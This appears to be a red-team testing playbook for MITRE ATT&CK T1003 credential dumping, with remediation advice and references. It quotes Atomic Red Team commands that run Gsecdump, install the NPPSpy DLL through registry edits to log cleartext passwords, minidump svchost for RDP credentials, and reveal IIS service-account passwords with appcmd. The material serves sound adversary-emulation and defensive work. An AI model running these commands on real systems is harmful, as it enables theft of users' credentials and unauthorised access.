---
name: "T1003_os-credential-dumping"
description: "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1003
  - credential-access
  - linux
  - macos
  - windows
technique_id: "T1003"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1003"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1003.001
  - T1003.002
  - T1003.003
  - T1003.004
  - T1003.005
  - T1003.006
  - T1003.007
  - T1003.008
prerequisites:
  []
severity_boost:
  T1003.001: "Chain with T1003.001 for deeper attack path"
  T1003.002: "Chain with T1003.002 for deeper attack path"
  T1003.003: "Chain with T1003.003 for deeper attack path"
---

# T1003 OS Credential Dumping

## High-Level Description

Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if OS Credential Dumping technique is applicable to target environment
- [ ] Check Linux systems for indicators of OS Credential Dumping
- [ ] Check macOS systems for indicators of OS Credential Dumping
- [ ] Check Windows systems for indicators of OS Credential Dumping
- [ ] Verify mitigations are bypassed or absent (9 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Gsecdump

Dump credentials from memory using Gsecdump.

Upon successful execution, you should see domain\username's followed by two 32 character hashes.

If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus. 
You will receive only error output if you do not run this test from an elevated context (run as administrator)

If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
"#{gsecdump_exe}" -a
```

**Dependencies:**
- Gsecdump must exist on disk at specified location (#{gsecdump_exe})

### Atomic Test 2: Credential Dumping with NPPSpy

Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
After user's logging in cleartext password is saved in C:\NPPSpy.txt.
Clean up deletes the files and reverses Registry changes.
NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
```

**Dependencies:**
- NPPSpy.dll must be available in ExternalPayloads directory

### Atomic Test 3: Dump svchost.exe to gather RDP credentials

The svchost.exe contains the RDP plain-text credentials.
Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/

Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
```

### Atomic Test 4: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)

AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
```

**Dependencies:**
- IIS must be installed prior to running the test

### Atomic Test 5: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)

AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
```

**Dependencies:**
- IIS must be installed prior to running the test


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to OS Credential Dumping by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1041 Encrypt Sensitive Information
Ensure Domain Controller backups are properly secured.

### M1040 Behavior Prevention on Endpoint
On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing.

### M1027 Password Policies
Ensure that local administrator accounts have complex, unique passwords across all systems on the network.

### M1017 User Training
Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.

### M1026 Privileged Account Management
Windows:
Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.

Linux:
Scraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.

### M1025 Privileged Process Integrity
On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.

### M1043 Credential Access Protection
With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.

### M1015 Active Directory Configuration
Manage the access control list for “Replicating Directory Changes All” and other permissions associated with domain controller replication. Consider adding users to the "Protected Users" Active Directory security group. This can help limit the caching of users' plaintext credentials.

### M1028 Operating System Configuration
Consider disabling or restricting NTLM. Consider disabling WDigest authentication.


## Detection

### Credential Dumping via Sensitive Memory and Registry Access Correlation


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| OS Credential Dumping technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Medium Detecting Attempts to Steal Passwords from Memory](https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea)
- [AdSecurity DCSync Sept 2015](https://adsecurity.org/?p=1729)
- [Microsoft DRSR Dec 2017](https://msdn.microsoft.com/library/cc228086.aspx)
- [Microsoft NRPC Dec 2017](https://msdn.microsoft.com/library/cc237008.aspx)
- [Microsoft GetNCCChanges](https://msdn.microsoft.com/library/dd207691.aspx)
- [Microsoft SAMR](https://msdn.microsoft.com/library/cc245496.aspx)
- [Powersploit](https://github.com/mattifestation/PowerSploit)
- [Samba DRSUAPI](https://wiki.samba.org/index.php/DRSUAPI)
- [Harmj0y DCSync Sept 2015](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)
- [Brining MimiKatz to Unix](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf)
- [Atomic Red Team - T1003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003)
- [MITRE ATT&CK - T1003](https://attack.mitre.org/techniques/T1003)
